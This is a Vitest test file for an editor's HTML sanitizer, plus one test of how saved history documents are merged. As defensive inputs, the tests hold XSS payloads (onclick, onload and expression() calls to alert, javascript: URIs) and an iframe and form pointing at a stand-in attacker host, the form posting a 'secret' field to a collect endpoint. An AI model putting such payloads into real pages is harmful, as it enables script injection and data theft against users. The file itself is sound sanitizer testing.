import { describe, expect, it } from "vitest";
import {
  mergeHistoryDocument,
  sanitizeEditorHtml,
} from "@/components/pages/learning/document-markdown";
import type { SavedLearningDocument } from "@/components/pages/learning/learning-page-types";

describe("document editor HTML sanitization", () => {
  it("removes CSP-blocked style attributes while preserving safe alignment", () => {
    const sanitized = sanitizeEditorHtml(
      '<p style="color:red" align="center" onclick="alert(1)">Safe text</p>'
      + '<p align="expression(alert(1))">Other text</p>',
    );

    expect(sanitized).toContain('<p align="center">Safe text</p>');
    expect(sanitized).toContain("<p>Other text</p>");
    expect(sanitized).not.toContain("style=");
    expect(sanitized).not.toContain("onclick=");
    expect(sanitized).not.toContain("expression");
  });

  it("preserves bounded pasted images while removing unsafe image sources", () => {
    const sanitized = sanitizeEditorHtml(
      '<p>截图</p><img src="data:image/png;base64,AAAA" alt="测试截图" onload="alert(1)">'
      + '<img src="javascript:alert(1)" alt="危险图片">'
      + '<img src="https://tracker.example.test/pixel.png" alt="外部追踪图片">',
    );

    expect(sanitized).toContain('src="data:image/png;base64,AAAA"');
    expect(sanitized).toContain('alt="测试截图"');
    expect(sanitized).not.toContain("onload");
    expect(sanitized).not.toContain("javascript:");
    expect(sanitized).not.toContain("tracker.example.test");
  });

  it("unwraps active and navigation elements and strips non-editor attributes", () => {
    const sanitized = sanitizeEditorHtml(
      '<iframe src="https://attacker.example.test/frame"></iframe>'
      + '<object data="https://attacker.example.test/object">object fallback</object>'
      + '<form action="https://attacker.example.test/collect"><input name="secret">form text</form>'
      + '<a href="javascript:alert(1)" target="_blank">link text</a>'
      + '<svg><a href="https://attacker.example.test/svg">svg link</a></svg>'
      + '<p id="tracked" class="remote" data-secret="value" contenteditable="true">Safe paragraph</p>',
    );

    expect(sanitized).toContain("object fallback");
    expect(sanitized).toContain("form text");
    expect(sanitized).toContain("link text");
    expect(sanitized).toContain("svg link");
    expect(sanitized).toContain("Safe paragraph");
    expect(sanitized).not.toMatch(/<(?:iframe|object|form|input|a|svg)\b/i);
    expect(sanitized).not.toMatch(/src=|data=|action=|href=|target=|id=|class=|data-secret|contenteditable/i);
    expect(sanitized).not.toContain("attacker.example.test");
  });

  it("updates the active history document instead of creating a renamed duplicate", () => {
    const original: SavedLearningDocument = {
      id: "history-1",
      taskId: "training_task_1",
      title: "学习计划",
      html: "<p>原内容</p>",
      markdown: "原内容\n",
      savedAt: new Date("2026-08-07T00:00:00.000Z"),
    };
    const renamed: SavedLearningDocument = {
      ...original,
      id: "new-generated-id",
      taskId: "another-task",
      title: "最终学习计划",
      savedAt: new Date("2026-08-07T01:00:00.000Z"),
    };

    expect(mergeHistoryDocument([original], renamed, original.id)).toEqual([
      expect.objectContaining({
        id: original.id,
        taskId: original.taskId,
        title: "最终学习计划",
        savedAt: renamed.savedAt,
      }),
    ]);
  });
});
